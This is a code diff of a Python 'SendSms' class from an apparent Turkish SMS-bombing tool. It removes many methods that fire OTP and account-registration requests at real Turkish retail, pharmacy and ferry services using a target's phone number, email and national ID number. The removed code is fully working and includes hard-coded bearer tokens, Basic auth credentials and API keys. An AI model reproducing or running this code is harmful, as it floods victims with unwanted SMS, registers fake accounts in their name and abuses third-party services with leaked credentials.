@@ -39,21 +39,7 @@ class SendSms():
                 raise
         except:    
             print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> KahveDünyası")
-        
-
-    #wmf.com.tr
-    def Wmf(self):
-        try:
-            wmf = requests.post("https://www.wmf.com.tr/users/register/", data={"confirm": "true", "date_of_birth": "1956-03-01", "email": self.mail, "email_allowed": "true", "first_name": "Memati", "gender": "male", "last_name": "Bas", "password": "31ABC..abc31", "phone": f"0{self.phone}"}, timeout=6)
-            if wmf.status_code == 202:
-                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}Gönderildi! {self.phone} --> WMF")
-                self.adet += 1   
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> WMF")
-    
-    
+       
     #bim
     def Bim(self):
         try:
@@ -65,24 +51,7 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> BIM")
-
-
-    #englishhome.com
-    def Englishhome(self):
-        try:
-            url = "https://www.englishhome.com:443/api/member/sendOtp"
-            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "*/*", "Referer": "https://www.englishhome.com/", "Content-Type": "application/json", "Origin": "https://www.englishhome.com", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Priority": "u=0", "Te": "trailers"}
-            json={"Phone": self.phone, "XID": ""}
-            r = requests.post(url, headers=headers, json=json, timeout=6)
-            if r.json()["isError"] == False:
-                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}Gönderildi! {self.phone} --> EnglishHome")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> EnglishHome")
           
-
     #suiste.com
     def Suiste(self):
         try:
@@ -127,55 +96,6 @@ class SendSms():
         except:
             print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> Evidea") 
 
-
-    #345dijital.com
-    def Ucdortbes(self):
-        try:
-            url = "https://api.345dijital.com:443/api/users/register"
-            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "AriPlusMobile/21 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "en-US,en;q=0.9", "Authorization": "null", "Connection": "close"}
-            json={"email": "", "name": "Memati", "phoneNumber": f"+90{self.phone}", "surname": "Bas"}
-            r = requests.post(url, headers=headers, json=json, timeout=6)
-            if r.json()["error"] == "E-Posta veya telefon zaten kayıtlı!":
-                print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Başarısız! {self.phone} --> 345Dijital")
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> 345Dijital")
-            self.adet += 1
-
-
-    #tiklagelsin.com
-    def TiklaGelsin(self):
-        try:
-            url = "https://svc.apps.tiklagelsin.com:443/user/graphql"
-            headers = {"Content-Type": "application/json", "X-Merchant-Type": "0", "Accept": "*/*", "Appversion": "2.4.1", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate", "X-No-Auth": "true", "User-Agent": "TiklaGelsin/809 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Device-Type": "2"}
-            json={"operationName": "GENERATE_OTP", "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", "variables": {"challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68", "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB", "phone": f"+90{self.phone}"}}
-            r = requests.post(url, headers=headers, json=json, timeout=6)
-            if r.json()["data"]["generateOtp"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}Gönderildi! {self.phone} --> TıklaGelsin")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> TıklaGelsin")
-
-
-    #naosstars.com
-    def Naosstars(self):
-        try:
-            url = "https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350"
-            headers = {"Uniqid": "9c9fa861-cc5d-43c0-b4ea-1b541be15351", "User-Agent": "naosstars/1.0030 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Access-Control-Allow-Origin": "*", "Locale": "en-TR", "Version": "1.0030", "Os": "ios", "Apiurl": "https://api.naosstars.com/api/", "Device-Id": "D41CE5F3-53BB-42CF-8611-B4FE7529C9BC", "Platform": "ios", "Accept-Language": "en-US,en;q=0.9", "Timezone": "Europe/Istanbul", "Globaluuidv4": "d57bd5d2-cf1e-420c-b43d-61117cf9b517", "Timezoneoffset": "-180", "Accept": "application/json", "Content-Type": "application/json; charset=utf-8", "Accept-Encoding": "gzip, deflate", "Apitype": "mobile_app"}
-            json={"telephone": f"+90{self.phone}", "type": "register"}
-            r = requests.post(url, headers=headers, json=json, timeout=6)
-            if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Gönderildi! {self.phone} --> Naos")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> Naos")
-
-
     #koton.com
     def Koton(self):
         try:
@@ -190,55 +110,6 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> Koton")
-
-
-    #hayatsu.com.tr
-    def Hayatsu(self):
-        try:
-            url = "https://api.hayatsu.com.tr:443/api/SignUp/SendOtp"
-            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://www.hayatsu.com.tr/", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiJhMTA5MWQ1ZS0wYjg3LTRjYWQtOWIxZi0yNTllMDI1MjY0MmMiLCJsb2dpbmRhdGUiOiIxOS4wMS4yMDI0IDIyOjU3OjM3Iiwibm90dXNlciI6InRydWUiLCJwaG9uZU51bWJlciI6IiIsImV4cCI6MTcyMTI0NjI1NywiaXNzIjoiaHR0cHM6Ly9oYXlhdHN1LmNvbS50ciIsImF1ZCI6Imh0dHBzOi8vaGF5YXRzdS5jb20udHIifQ.Cip4hOxGPVz7R2eBPbq95k6EoICTnPLW9o2eDY6qKMM", "Origin": "https://www.hayatsu.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Te": "trailers"}
-            data = {"mobilePhoneNumber": self.phone, "actionType": "register"}
-            r = requests.post(url, headers=headers, data=data, timeout=6)
-            if r.json()["is_success"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}Gönderildi! {self.phone} --> HayatSu")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> HayatSu")
-
-
-    #hizliecza.com.tr
-    def Hizliecza(self):
-        try:
-            url = "https://prod.hizliecza.net:443/mobil/account/sendOTP"
-            headers = {"Accept": "application/json", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate, br", "User-Agent": "hizliecza/31 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Accept-Language": "en-GB,en;q=0.9", "Authorization": "Bearer null"}
-            json={"otpOperationType": 1, "phoneNumber": f"+90{self.phone}"}
-            r = requests.post(url, headers=headers, json=json, timeout=6)
-            if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}Gönderildi! {self.phone} --> HızlıEcza")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> HızlıEcza")
-
-
-    #metro-tr.com
-    def Metro(self):
-        try:
-            url = "https://mobile.metro-tr.com:443/api/mobileAuth/validateSmsSend"
-            headers = {"Accept": "*/*", "Content-Type": "application/json; charset=utf-8", "Accept-Encoding": "gzip, deflate, br", "Applicationversion": "2.4.1", "Applicationplatform": "2", "User-Agent": "Metro Turkiye/2.4.1 (com.mcctr.mobileapplication; build:4; iOS 15.8.3) Alamofire/4.9.1", "Accept-Language": "en-BA;q=1.0, tr-BA;q=0.9, bs-BA;q=0.8", "Connection": "keep-alive"}
-            json={"methodType": "2", "mobilePhoneNumber": self.phone}
-            r = requests.post(url, headers=headers, json=json, timeout=6)
-            if r.json()["status"] == "success":
-                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}Gönderildi! {self.phone} --> MetroMarket")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> MetroMarket")
-
 
     #file.com.tr
     def File(self):
@@ -300,22 +171,6 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> Yapp")
-    
-    
-    #yilmazticaret.net
-    def YilmazTicaret(self):
-        try:
-            url = "https://app.buyursungelsin.com:443/api/customer/form/checkx"
-            headers = {"Accept": "*/*", "Content-Type": "multipart/form-data; boundary=q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl", "Accept-Encoding": "gzip, deflate, br", "Authorization": "Basic Z2Vsc2luYXBwOjR1N3ghQSVEKkctS2FOZFJnVWtYcDJzNXY4eS9CP0UoSCtNYlFlU2hWbVlxM3Q2dzl6JEMmRilKQE5jUmZValduWnI0dTd4IUElRCpHLUthUGRTZ1ZrWXAyczV2OHkvQj9FKEgrTWJRZVRoV21acTR0Nnc5eiRDJkYpSkBOY1Jm", "User-Agent": "Ylmaz/38 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Accept-Language": "en-GB,en;q=0.9"}
-            data = f"--q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl\r\ncontent-disposition: form-data; name=\"fonksiyon\"\r\n\r\ncustomer/form/checkx\r\n--q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl\r\ncontent-disposition: form-data; name=\"method\"\r\n\r\nPOST\r\n--q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl\r\ncontent-disposition: form-data; name=\"telephone\"\r\n\r\n0 ({self.phone[:3]}) {self.phone[3:6]} {self.phone[6:8]} {self.phone[8:]}\r\n--q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl\r\ncontent-disposition: form-data; name=\"token\"\r\n\r\nd7841d399a16d0060d3b8a76bf70542e\r\n--q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl--\r\n"
-            r = requests.post(url, headers=headers, data=data, timeout=6)
-            if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}Gönderildi! {self.phone} --> BuyursunGelsin")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> BuyursunGelsin")
 
     #dominos.com.tr
     def Dominos(self):
@@ -345,23 +200,7 @@ class SendSms():
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> Pidem")
-
-
-    #frink.com.tr
-    def Frink(self):
-        try:
-            url = "https://api.frink.com.tr:443/api/auth/postSendOTP"
-            headers = {"Accept": "*/*", "Content-Type": "application/json", "Authorization": "", "Accept-Encoding": "gzip, deflate, br", "User-Agent": "Frink/1.6.0 (com.frink.userapp; build:3; iOS 15.8.3) Alamofire/4.9.1", "Accept-Language": "en-BA;q=1.0, tr-BA;q=0.9, bs-BA;q=0.8", "Connection": "keep-alive"}
-            json={"areaCode": "90", "etkContract": True, "language": "TR", "phoneNumber": "90"+self.phone}
-            r = requests.post(url, headers=headers, json=json, timeout=6)
-            if r.json()["processStatus"] == "SUCCESS":
-                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}Gönderildi! {self.phone} --> Frink")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> Frink")     
+            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> Pidem")     
     
     #kofteciyusuf.com
     def KofteciYusuf(self):
@@ -378,63 +217,5 @@ class SendSms():
         except:
             print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> KöfteciYusuf")
 
-    #orwi.app
-    def Orwi(self):
-        try:
-            url = "https://gandalf.orwi.app:443/api/user/requestOtp"
-            headers = {"Content-Type": "application/json", "Accept": "application/json", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-GB,en;q=0.9", "Token": "", "Apikey": "YWxpLTEyMzQ1MTEyNDU2NTQzMg", "Origin": "capacitor://localhost", "Region": "EN", "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148", "Connection": "keep-alive"}
-            json={"gsm": f"+90{self.phone}", "source": "orwi"}
-            r = requests.post(url, headers=headers, json=json, timeout=6)
-            if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}Gönderildi! {self.phone} --> Orwi")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> Orwi")
-
-    #money.com.tr
-    def Money(self):
-        try:
-            url = "https://www.money.com.tr:443/Account/ValidateAndSendOTP"
-            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "*/*", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://www.money.com.tr/money-kartiniz-var-mi", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.money.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
-            data = {"phone": f"{self.phone[:3]} {self.phone[3:10]}", "GRecaptchaResponse": ''}
-            r = requests.post(url, headers=headers, data=data, timeout=6)
-            if r.json()["resultType"] == 0:
-                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}Gönderildi! {self.phone} --> Money")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> Money")
 #Bu Tool "https://github.com/s4m3dnotfound/LegacySMS" adresine aittir.
 
-    #jimmykey.com
-    def Jimmykey(self):
-        try:
-            r = requests.post(f"https://www.jimmykey.com:443/tr/p/User/SendConfirmationSms?gsm={self.phone}&gRecaptchaResponse=undefined", timeout=6)
-            if r.json()["Sonuc"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}Gönderildi! {self.phone} --> jimmykey")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> jimmykey")
-        #Bu Tool "https://github.com/s4m3dnotfound/LegacySMS" adresine aittir.
-
-    #api.ido.com.tr
-    def Ido(self):
-        try:
-            url = "https://api.ido.com.tr:443/idows/v2/register"
-            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr", "Content-Type": "application/json", "Origin": "https://www.ido.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.ido.com.tr/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
-            json={"birthDate": True, "captcha": "", "checkPwd": "313131", "code": "", "day": 24, "email": self.mail, "emailNewsletter": False, "firstName": "MEMATI", "gender": "MALE", "lastName": "BAS", "mobileNumber": f"0{self.phone}", "month": 9, "pwd": "313131", "smsNewsletter": True, "tckn": self.tc, "termsOfUse": True, "year": 1977}
-            r = requests.post(url, headers=headers, json=json, timeout=6)
-            if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}Gönderildi! {self.phone} --> IDO")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> IDO")
-
-#Bu Tool "https://github.com/s4m3dnotfound/LegacySMS" adresine aittir.
